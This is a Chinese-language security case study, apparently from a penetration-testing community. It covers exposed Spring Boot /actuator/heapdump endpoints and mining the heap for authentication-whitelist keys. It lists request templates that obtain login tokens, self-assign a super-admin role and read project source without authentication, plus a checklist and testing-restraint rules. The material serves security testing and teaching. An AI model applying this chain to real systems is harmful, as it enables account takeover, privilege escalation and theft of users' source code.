# 案例课：heapdump 白名单 = 免鉴权路由清单（LynxCode 类 AI 建站平台）

> 来源：报告包 yunji（2026-10）· 域：api-security / Spring Boot

## 一句话

`/actuator/heapdump` 不用脱裤，直接在 JVM 堆里搜 `ignore-urls` / `security.ignore` / 自定义白名单；白名单里往往藏着三条免鉴权原语：任意用户 token、任意人自封超管、任意项目源码读取。

## 链

1. `GET /actuator/heapdump` → 下载 hprof
2. 堆里 grep 白名单键：`ignore-urls`、`ignoreUrls`、`security.ignore`、`excludePathPatterns`
3. 逐条只读验证：
   - `GET /<svc>/getLoginToken?userId=<自己>&appKey=<白名单key>` → 下发 token
   - `POST /<svc>/api/v1/userRole {"userId":<自己>,"roleId":1}` → 自封超管
   - `GET /<svc>/getChatInfoByUuid/<uuid>` → 免鉴权读项目/对话（AI 构建平台常存源码）
4. 前端「自签名」网关：签名 key 由页面自己生成 → 按 JS 重算即可伪造

## 判据

- 白名单路由返回业务 JSON 而非 401/302
- `getLoginToken` 对**自己的 userId** 下发 token = 免密原语成立
- `userRole` 改前记录原 role，改后立刻验 `/me`

## 边界/纪律

- `userId` 先用自己账号，别直接打 1
- heapdump 可能几百 MB，先 `strings | grep` 再决定是否全读
- heapdump 里同时有数据库口令、Redis、第三方 key → 只取所需，别整包带走
- 修复版可能只关 actuator 而白名单仍在 → 换别的泄露面（env、logback、swagger）

## 检查清单

- [ ] `/actuator` 暴露面（heapdump/env/mappings）
- [ ] 堆里白名单键
- [ ] getLoginToken 自测
- [ ] userRole 自封
- [ ] 源码读取端点

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
